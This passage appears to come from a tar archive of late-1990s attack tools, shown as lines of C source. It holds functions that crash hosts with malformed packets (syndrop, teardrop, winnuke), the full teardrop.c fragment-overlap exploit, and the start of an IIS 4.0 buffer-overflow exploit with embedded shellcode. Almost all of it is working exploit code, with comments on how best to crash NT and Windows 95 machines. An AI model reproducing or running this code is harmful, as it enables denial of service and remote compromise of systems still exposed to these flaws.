            "  *((u_short *) p_ptr) = htons (8 + PADDING * 2);\t/* UDP total length *//* Increases UDP total length to 48 bytes",
            "\t\t\t\t\t\t\t   Which is too big! */",
            "  if (sendto (sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  /*  We set the fragment offset to be inside of the previous packet's",
            "   *  payload (it overlaps inside the previous packet) but do not include",
            "   *  enough payload to cover complete the datagram.  Just the header will",
            "   *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "   *  better.",
            "   */",
            "  p_ptr = &packet[2];\t\t/* IP total length is 2 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);",
            "  p_ptr += 4;\t\t\t/* IP offset is 6 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (MAGIC);",
            "  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "/* syndrop(destination) */",
            "u_long name_resolve (u_char *);",
            "u_short in_cksum (u_short *, int);",
            "void send_synd (int, u_long, u_long, u_short, u_short, u_long, u_long);",
            "int ",
            "syndrop (char *synd_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  u_long s_start = 0, s_end = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one)) < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (synd_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = COUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      send_synd (rip_sock, src_ip, dst_ip, src_prt, dst_prt, s_start, s_end);",
            "      fprintf (stderr, \"",
            "[1;35m&",
            "[0m\");",
            "    }",
            "  return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void ",
            "send_synd (int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short dst_prt, u_long seq1, u_long seq2)",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  /*",
            "   * Grab some memory for our packet, align p_ptr to point at the beginning",
            "   * of our packet, and then fill it with zeros.",
            "   */",
            "  packet = (u_char *) malloc (IPH + UDPH + PADDING);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);\t/* Set it all to zero */",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_TCP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* TCP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* TCP destination port */",
            "  p_ptr += 2;",
            "  *((u_long *) p_ptr) = seq1;\t/* TCP sequence # */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = 0;\t/* ack */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (8 + PADDING * 2);\t/* TCP data offset */",
            "  /* Increases TCP total length to 48 bytes Which is too big! */",
            "  p_ptr += 2;",
            "  *((u_char *) p_ptr) = TH_SYN;\t/* flags: mark SYN */",
            "  p_ptr += 1;",
            "  *((u_short *) p_ptr) = seq2 - seq1;\t/* window */",
            "  *((u_short *) p_ptr) = 0x44;\t/* checksum : this is magic value for NT, W95.  dissasemble M$ C++ to see why, if you have time  */",
            "  *((u_short *) p_ptr) = 0;\t/* urgent */",
            "  if (sendto (sock, packet, IPH + TCPH + PADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  /*  We set the fragment offset to be inside of the previous packet's",
            "   *  payload (it overlaps inside the previous packet) but do not include",
            "   *  enough payload to cover complete the datagram.  Just the header will",
            "   *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "   *  better.",
            "   */",
            "  p_ptr = &packet[2];\t\t/* IP total length is 2 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);",
            "  p_ptr += 4;\t\t\t/* IP offset is 6 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (MAGIC);",
            "  p_ptr = &packet[24];\t\t/* hop in to the sequence again... */",
            "  *((u_long *) p_ptr) = seq2;\t/* TCP sequence # */",
            "  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "/* teardrop(destination) */",
            "u_long name_resolve (u_char *);",
            "u_short in_cksum (u_short *, int);",
            "void tear_frags (int, u_long, u_long, u_short, u_short);",
            "int ",
            "teardrop (char *tear_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (tear_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = COUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      tear_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;34m%%",
            "[0m\");",
            "    }",
            "  return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void ",
            "tear_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "\t    u_short dst_prt)",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  /*",
            "   * Grab some memory for our packet, align p_ptr to point at the beginning",
            "   * of our packet, and then fill it with zeros.",
            "   */",
            "  packet = (u_char *) malloc (IPH + UDPH + TPADDING);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + TPADDING);",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + TPADDING);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + TPADDING);\t/* UDP total length */",
            "  if (sendto (sock, packet, IPH + UDPH + TPADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  /*  We set the fragment offset to be inside of the previous packet's",
            "   *  payload (it overlaps inside the previous packet) but do not include",
            "   *  enough payload to cover complete the datagram.  Just the header will",
            "   *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "   *  better.",
            "   */",
            "  p_ptr = &packet[2];\t\t/* IP total length is 2 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);",
            "  p_ptr += 4;\t\t\t/* IP offset is 6 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (MAGIC);",
            "  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "/* winnuke(destination) */",
            "int winnuke_s;",
            "char *str = \"bill_loves_you!\";",
            "struct sockaddr_in addr, spoofedaddr;",
            "struct hostent *host;",
            "int ",
            "winnuke_sub (int sock, char *server, int port)",
            "  struct sockaddr_in blah;",
            "  struct hostent *he;",
            "  bzero ((char *) &blah, sizeof (blah));",
            "  blah.sin_family = AF_INET;",
            "  blah.sin_addr.s_addr = inet_addr (server);",
            "  blah.sin_port = htons (port);",
            "  if ((he = gethostbyname (server)) != NULL)",
            "    {",
            "      bcopy (he->h_addr, (char *) &blah.sin_addr, he->h_length);",
            "    }",
            "  else",
            "    {",
            "      if ((blah.sin_addr.s_addr = inet_addr (server)) < 0)",
            "\t  perror (\"gethostbyname()\");",
            "\t  return (-3);",
            "    }",
            "  if (connect (sock, (struct sockaddr *) &blah, 16) == -1)",
            "    {",
            "      perror (\"connect()\");",
            "      close (sock);",
            "      return (-4);",
            "    }",
            "  return;",
            "int ",
            "winnuke (char *winnuke_host)",
            "  int wncounter;",
            "  for (wncounter = 0; wncounter < WNUKEREP; wncounter++)",
            "    {",
            "      if ((winnuke_s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)",
            "\t  perror (\"socket()\");",
            "\t  exit (-1);",
            "      winnuke_sub (winnuke_s, winnuke_host, WNUKEPORT);",
            "      send (winnuke_s, str, strlen (str), MSG_OOB);",
            "      fprintf (stderr, \"",
            "[1;37m*",
            "[0m\");",
            "      close (winnuke_s);",
            "    }",
            "  return;",
            "/* EOF */",
            "datapool/src/teardrop.c",
            "0100644",
            "0000000",
            "0000000",
            "00000015432",
            "07100656426",
            "014146",
            "ustar  ",
            "root",
            "root",
            " *  Copyright (c) 1997 route|daemon9  <route@infonexus.com> 11.3.97",
            " *  Linux/NT/95 Overlap frag bug exploit",
            " *  Exploits the overlapping IP fragment bug present in all Linux kernels and",
            " *  NT 4.0 / Windows 95 (others?)",
            " *  Based off of:   flip.c by klepto",
            " *  Compiles on:    Linux, *BSD*",
            " *  gcc -O2 teardrop.c -o teardrop",
            " *      OR",
            " *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#ifdef STRANGE_BSD_BYTE_ORDERING_THING",
            "                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */",
            "#define FIX(n)  (n)",
            "#else                   /* OpenBSD 2.1, all Linux */",
            "#define FIX(n)  htons(n)",
            "#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */",
            "#define IP_MF   0x2000  /* More IP fragment en route */",
            "#define IPH     0x14    /* IP header size */",
            "#define UDPH    0x8     /* UDP header size */",
            "#define PADDING 0x1c    /* datagram frame padding for first packet */",
            "#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */",
            "#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can",
            "                         * withstand maybe 5 or 10 sometimes...  Experiment.",
            "                         */",
            "void usage(u_char *);",
            "u_long name_resolve(u_char *);",
            "u_short in_cksum(u_short *, int);",
            "void send_frags(int, u_long, u_long, u_short, u_short);",
            "int main(int argc, char **argv)",
            "    int one = 1, count = 0, i, rip_sock;",
            "    u_long  src_ip = 0, dst_ip = 0;",
            "    u_short src_prt = 0, dst_prt = 0;",
            "    struct in_addr addr;",
            "    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "        perror(\"raw socket\");",
            "        exit(1);",
            "    }",
            "    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))",
            "        < 0)",
            "    {",
            "        perror(\"IP_HDRINCL\");",
            "        exit(1);",
            "    }",
            "    if (argc < 3) usage(argv[0]);",
            "    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))",
            "    {",
            "        fprintf(stderr, \"What the hell kind of IP address is that?\\n\");",
            "        exit(1);",
            "    }",
            "    while ((i = getopt(argc, argv, \"s:t:n:\")) != EOF)",
            "    {",
            "        switch (i)",
            "        {",
            "            case 's':               /* source port (should be emphemeral) */",
            "                src_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 't':               /* dest port (DNS, anyone?) */",
            "                dst_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 'n':               /* number to send */",
            "                count   = atoi(optarg);",
            "                break;",
            "            default :",
            "                usage(argv[0]);",
            "                break;              /* NOTREACHED */",
            "        }",
            "    }",
            "    srandom((unsigned)(time((time_t)0)));",
            "    if (!src_prt) src_prt = (random() % 0xffff);",
            "    if (!dst_prt) dst_prt = (random() % 0xffff);",
            "    if (!count)   count   = COUNT;",
            "    fprintf(stderr, \"Death on flaxen wings:\\n\");",
            "    addr.s_addr = src_ip;",
            "    fprintf(stderr, \"From: %15s.%5d\\n\", inet_ntoa(addr), src_prt);",
            "    addr.s_addr = dst_ip;",
            "    fprintf(stderr, \"  To: %15s.%5d\\n\", inet_ntoa(addr), dst_prt);",
            "    fprintf(stderr, \" Amt: %5d\\n\", count);",
            "    fprintf(stderr, \"[ \");",
            "    for (i = 0; i < count; i++)",
            "    {",
            "        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "        fprintf(stderr, \"b00m \");",
            "    }",
            "    fprintf(stderr, \"]\\n\");",
            "    return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "                u_short dst_prt)",
            "    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */",
            "    u_char byte;                            /* a byte */",
            "    struct sockaddr_in sin;                 /* socket protocol structure */",
            "    sin.sin_family      = AF_INET;",
            "    sin.sin_port        = src_prt;",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    /*",
            "     * Grab some memory for our packet, align p_ptr to point at the beginning",
            "     * of our packet, and then fill it with zeros.",
            "     */",
            "    packet = (u_char *)malloc(IPH + UDPH + PADDING);",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */",
            "    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    /*  We set the fragment offset to be inside of the previous packet's",
            "     *  payload (it overlaps inside the previous packet) but do not include",
            "     *  enough payload to cover complete the datagram.  Just the header will",
            "     *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "     *  better.",
            "     */",
            "    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */",
            "    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);",
            "    p_ptr += 4;                 /* IP offset is 6 bytes into the header */",
            "    *((u_short *)p_ptr) = FIX(MAGIC);",
            "    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    free(packet);",
            "u_long name_resolve(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "        if (!(host_ent = gethostbyname(host_name))) return (0);",
            "        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);",
            "    }",
            "    return (addr.s_addr);",
            "void usage(u_char *name)",
            "    fprintf(stderr, \"%s source_ip target_ip [-s src port] [-t dst port] [-n packets]\\n\", name);",
            "    exit(0);",
            "datapool/src/tesoiis.c",
            "0100644",
            "0000000",
            "0000000",
            "00000020207",
            "07077316644",
            "014011",
            "ustar  ",
            "root",
            "root",
            "/* iis 4.0 exploit",
            " * by eeye security",
            " * ported to unix/C by the teso crew.",
            " * shoutouts to #hax and everyone else knowing us...",
            " *  you know who you are.",
            " * gcc -o tesoiis tesoiis.c -Wall",
            "#include <sys/types.h>",
            "#include <sys/ioctl.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#include <net/if.h>",
            "#include <netinet/in.h>",
            "#include <errno.h>",
            "#include <fcntl.h>",
            "#include <stdarg.h>",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "int\tnet_connect (struct sockaddr_in *cs, char *server,",
            "\tunsigned short int port, char *sourceip,",
            "\tunsigned short int sourceport, int sec);",
            "void\tnet_write (int fd, const char *str, ...);",
            "unsigned long int       net_resolve (char *host);",
            "char stuff[] = \"\\x42\\x68\\x66\\x75\\x41\\x50\"; /* \"!GET /\" */",
            "#define\tURL_OFFSET\t1055",
            "char front[] = \"GET /AAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"\\x41\\x41\\x41\\x41\\x41\\x41\\xb0\\x87\\x67\\x68\\xb0\\x87\"",
            "\t\"\\x67\\x68\\x90\\x90\\x90\\x90\\x58\\x58\\x90\\x33\\xc0\\x50\"",
            "\t\"\\x5b\\x53\\x59\\x8b\\xde\\x66\\xb8\\x21\\x02\\x03\\xd8\\x32\"",
            "\t\"\\xc0\\xd7\\x2c\\x21\\x88\\x03\\x4b\\x3c\\xde\\x75\\xf4\\x43\"",
            "\t\"\\x43\\xba\\xd0\\x10\\x67\\x68\\x52\\x51\\x53\\xff\\x12\\x8b\"",
            "\t\"\\xf0\\x8b\\xf9\\xfc\\x59\\xb1\\x06\\x90\\x5a\\x43\\x32\\xc0\"",
            "\t\"\\xd7\\x50\\x58\\x84\\xc0\\x50\\x58\\x75\\xf4\\x43\\x52\\x51\"",
            "\t\"\\x53\\x56\\xb2\\x54\\xff\\x12\\xab\\x59\\x5a\\xe2\\xe6\\x43\"",
            "\t\"\\x32\\xc0\\xd7\\x50\\x58\\x84\\xc0\\x50\\x58\\x75\\xf4\\x43\"",
            "\t\"\\x52\\x53\\xff\\x12\\x8b\\xf0\\x5a\\x33\\xc9\\x50\\x58\\xb1\"",
            "\t\"\\x05\\x43\\x32\\xc0\\xd7\\x50\\x58\\x84\\xc0\\x50\\x58\\x75\"",
            "\t\"\\xf4\\x43\\x52\\x51\\x53\\x56\\xb2\\x54\\xff\\x12\\xab\\x59\"",
            "\t\"\\x5a\\xe2\\xe6\\x33\\xc0\\x50\\x40\\x50\\x40\\x50\\xff\\x57\"",
            "\t\"\\xf4\\x89\\x47\\xcc\\x33\\xc0\\x50\\x50\\xb0\\x02\\x66\\xab\"",
            "\t\"\\x58\\xb4\\x50\\x66\\xab\\x58\\xab\\xab\\xab\\xb1\\x21\\x90\"",
            "\t\"\\x66\\x83\\xc3\\x16\\x8b\\xf3\\x43\\x32\\xc0\\xd7\\x3a\\xc8\"",
            "\t\"\\x75\\xf8\\x32\\xc0\\x88\\x03\\x56\\xff\\x57\\xec\\x90\\x66\"",
            "\t\"\\x83\\xef\\x10\\x92\\x8b\\x52\\x0c\\x8b\\x12\\x8b\\x12\\x92\"",
            "\t\"\\x8b\\xd7\\x89\\x42\\x04\\x52\\x6a\\x10\\x52\\xff\\x77\\xcc\"",
            "\t\"\\xff\\x57\\xf8\\x5a\\x66\\x83\\xee\\x08\\x56\\x43\\x8b\\xf3\"",
            "\t\"\\xfc\\xac\\x84\\xc0\\x75\\xfb\\x41\\x4e\\xc7\\x06\\x8d\\x8a\"",
            "\t\"\\x8d\\x8a\\x81\\x36\\x80\\x80\\x80\\x80\\x33\\xc0\\x50\\x50\"",
            "\t\"\\x6a\\x48\\x53\\xff\\x77\\xcc\\xff\\x57\\xf0\\x58\\x5b\\x8b\"",
            "\t\"\\xd0\\x66\\xb8\\xff\\x0f\\x50\\x52\\x50\\x52\\xff\\x57\\xe8\"",
            "\t\"\\x8b\\xf0\\x58\\x90\\x90\\x90\\x90\\x50\\x53\\xff\\x57\\xd4\"",
            "\t\"\\x8b\\xe8\\x33\\xc0\\x5a\\x52\\x50\\x52\\x56\\xff\\x77\\xcc\"",
            "\t\"\\xff\\x57\\xec\\x80\\xfc\\xff\\x74\\x0f\\x50\\x56\\x55\\xff\"",
            "\t\"\\x57\\xd8\\x80\\xfc\\xff\\x74\\x04\\x85\\xc0\\x75\\xdf\\x55\"",
            "\t\"\\xff\\x57\\xdc\\x33\\xc0\\x40\\x50\\x53\\xff\\x57\\xe4\\x90\"",
            "\t\"\\x90\\x90\\x90\\xff\\x6c\\x66\\x73\\x6f\\x66\\x6d\\x54\\x53\"",
            "\t\"\\x21\\x80\\x8d\\x84\\x93\\x86\\x82\\x95\\x21\\x80\\x8d\\x98\"",
            "\t\"\\x93\\x8a\\x95\\x86\\x21\\x80\\x8d\\x84\\x8d\\x90\\x94\\x86\"",
            "\t\"\\x21\\x80\\x8d\\x90\\x91\\x86\\x8f\\x21\\x78\\x8a\\x8f\\x66\"",
            "\t\"\\x99\\x86\\x84\\x21\\x68\\x8d\\x90\\x83\\x82\\x8d\\x62\\x8d\"",
            "\t\"\\x8d\\x90\\x84\\x21\\x78\\x74\\x70\\x64\\x6c\\x54\\x53\\x21\"",
            "\t\"\\x93\\x86\\x84\\x97\\x21\\x94\\x86\\x8f\\x85\\x21\\x94\\x90\"",
            "\t\"\\x84\\x8c\\x86\\x95\\x21\\x84\\x90\\x8f\\x8f\\x86\\x84\\x95\"",
            "\t\"\\x21\\x88\\x86\\x95\\x89\\x90\\x94\\x95\\x83\\x9a\\x8f\\x82\"",
            "\t\"\\x8e\\x86\\x21\\x90\\x98\\x8f\\x4f\\x86\\x99\\x86\\x21\"",
            "/* stick it in here */",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\\x21\"",
            "\t\"\\x21\\x21\\x21\"",
            "\t\".htr HTTP/1.0\";",
            "void",
            "usage (void)",
            "\tprintf (\"usage: ./tesoiis host port url\\n\");",
            "\texit (EXIT_FAILURE);",
            "main (int argc, char *argv[])",
            "\t/* yadda,yadda.. you can try exploiting our exploit!!",
            "\t * update: hmm.. is this exploitable? gets EIP touched by exit()?",
            "\t * gotta check this later...",
            "\t */",
            "\tchar\t\t\thost[256], url[256];",
            "\tint\t\t\tport,sd,t = 0;",
            "\tint\t\t\tm = 0;",
            "\tchar\t\t\t*cc, *pfft;",
            "\tstruct sockaddr_in\tcs;",
            "\tprintf (\"teso crew IIS exploit.. shellcode by eEye.\\n\");",
            "\tprintf (\"------------------------------------------\\n\");",
            "\tif (argc < 4)",
            "\t\tusage();",
            "\tstrcpy (host, argv[1]);",
            "\tstrcpy (url, argv[3]);",
            "\tport = atoi (argv[2]);",
            "\tif ((port < 1) || (port > 65535))",
            "\t\tusage();",
            "\tcc = url;",
            "\tpfft = front + URL_OFFSET;",
            "\twhile (*cc) {",
            "\t\tif (*cc == '/' && 0 == t) {",
            "\t\t\tmemcpy (pfft, stuff, 6);",
            "\t\t\tpfft += 6;",
            "\t\t\tt = 1;",
